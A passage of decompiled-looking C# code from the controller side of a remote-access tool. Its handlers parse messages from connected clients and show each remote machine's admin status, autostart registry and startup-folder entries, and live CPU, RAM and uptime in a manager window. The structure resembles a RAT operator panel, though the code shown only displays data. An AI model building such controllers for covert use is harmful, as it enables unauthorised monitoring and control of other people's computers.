                manager.BoxCmd.SelectionStart = manager.BoxCmd.TextLength;
                manager.BoxCmd.ScrollToCaret();
            }
            else
            {
                client.Disconnected();
            }
        }
        catch
        {
        }
    }

    public void Startup(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (manager == null)
            {
                client.Disconnected();
                return;
            }
            manager.Admin = bool.Parse(unpack_msgpack.ForcePathObject("Admin").AsString);
            manager.ListStartup.Items.Clear();
            string[] array = Strings.Split(unpack_msgpack.ForcePathObject("Message").AsString, "\r\n");
            string[] array2 = array;
            foreach (string text in array2)
            {
                if (text.StartsWith("%CU_RUN%"))
                {
                    string[] array3 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem = new ListViewItem
                    {
                        Text = array3[1]
                    };
                    listViewItem.SubItems.Add(array3[2]);
                    listViewItem.ImageIndex = 0;
                    listViewItem.Group = manager.ListStartup.Groups["Group1"];
                    manager.ListStartup.Items.Add(listViewItem);
                }
                else if (text.StartsWith("%CU_ONCE%"))
                {
                    string[] array4 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem2 = new ListViewItem
                    {
                        Text = array4[1]
                    };
                    listViewItem2.SubItems.Add(array4[2]);
                    listViewItem2.ImageIndex = 0;
                    listViewItem2.Group = manager.ListStartup.Groups["Group2"];
                    manager.ListStartup.Items.Add(listViewItem2);
                }
                else if (text.StartsWith("%CU_EXPLO%"))
                {
                    string[] array5 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem3 = new ListViewItem
                    {
                        Text = array5[1]
                    };
                    listViewItem3.SubItems.Add(array5[2]);
                    listViewItem3.ImageIndex = 0;
                    listViewItem3.Group = manager.ListStartup.Groups["Group3"];
                    manager.ListStartup.Items.Add(listViewItem3);
                }
                else if (text.StartsWith("%MA_RUN%"))
                {
                    string[] array6 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem4 = new ListViewItem
                    {
                        Text = array6[1]
                    };
                    listViewItem4.SubItems.Add(array6[2]);
                    listViewItem4.ImageIndex = 0;
                    listViewItem4.Group = manager.ListStartup.Groups["Group4"];
                    manager.ListStartup.Items.Add(listViewItem4);
                }
                else if (text.StartsWith("%MA_ONCE%"))
                {
                    string[] array7 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem5 = new ListViewItem
                    {
                        Text = array7[1]
                    };
                    listViewItem5.SubItems.Add(array7[2]);
                    listViewItem5.ImageIndex = 0;
                    listViewItem5.Group = manager.ListStartup.Groups["Group5"];
                    manager.ListStartup.Items.Add(listViewItem5);
                }
                else if (text.StartsWith("%MA_EXPLO%"))
                {
                    string[] array8 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem6 = new ListViewItem
                    {
                        Text = array8[1]
                    };
                    listViewItem6.SubItems.Add(array8[2]);
                    listViewItem6.ImageIndex = 0;
                    listViewItem6.Group = manager.ListStartup.Groups["Group6"];
                    manager.ListStartup.Items.Add(listViewItem6);
                }
                else if (text.StartsWith("%FOLD_UP%"))
                {
                    string[] array9 = Strings.Split(text, "-=>");
                    ListViewItem listViewItem7 = new ListViewItem
                    {
                        Text = array9[1]
                    };
                    listViewItem7.SubItems.Add(Methods.BytesToString(long.Parse(array9[2])));
                    if (listViewItem7.Text == "desktop.ini")
                    {
                        listViewItem7.ImageIndex = 2;
                    }
                    else
                    {
                        listViewItem7.ImageIndex = 1;
                    }
                    listViewItem7.Group = manager.ListStartup.Groups["Group7"];
                    manager.ListStartup.Items.Add(listViewItem7);
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }

    public void Performance(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command2").AsString)
            {
                case "Data":
                    {
                        Manager manager3 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager3 != null)
                        {
                            manager3.CPU.Text = unpack_msgpack.ForcePathObject("CPU").AsString;
                            manager3.RAM.Text = unpack_msgpack.ForcePathObject("RAM").AsString;
                            manager3.bunifuLabel_0.Text = unpack_msgpack.ForcePathObject("CountCPUS").AsString;
                            manager3.TimeSystem.Text = unpack_msgpack.ForcePathObject("TimeSystem").AsString + "Minutes";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Stop":
                    {
                        Manager manager2 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager2 != null)
                        {
                            manager2.PowerPerformance.Enabled = true;
                            manager2.PowerPerformance.Text = "Start";
                            manager2.CPU.Text = "0%";
                            manager2.RAM.Text = "0";
                            manager2.bunifuLabel_0.Text = "0";
                            manager2.TimeSystem.Text = "0";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Start":
                    {
                        Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager != null)
                        {
                            manager.PowerPerformance.Enabled = true;
                            manager.PowerPerformance.Text = "Stop";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
